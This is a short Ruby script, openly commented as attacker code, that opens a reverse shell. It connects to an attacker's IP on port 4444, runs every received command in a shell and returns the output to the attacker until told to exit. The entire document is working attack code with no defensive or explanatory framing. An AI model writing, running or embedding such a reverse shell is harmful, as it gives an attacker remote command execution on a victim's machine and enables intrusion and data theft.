require 'socket'

# Define the attacker's IP and Port
attacker_ip = '10.0.1.35' # Replace with your attacker's IP
attacker_port = 4444          # Replace with your desired port

# Connect to the attacker's machine
socket = TCPSocket.new(attacker_ip, attacker_port)

# Loop to continuously listen for commands from the attacker
while true do
  # Receive the command from the attacker
  command = socket.gets

  # Exit if the attacker sends the "exit" command
  break if command.strip == 'exit'

  # Execute the received command and send back the result
  output = `#{command}`

  # Send the result of the command execution back to the attacker
  socket.puts(output)
end

# Close the connection when done
socket.close
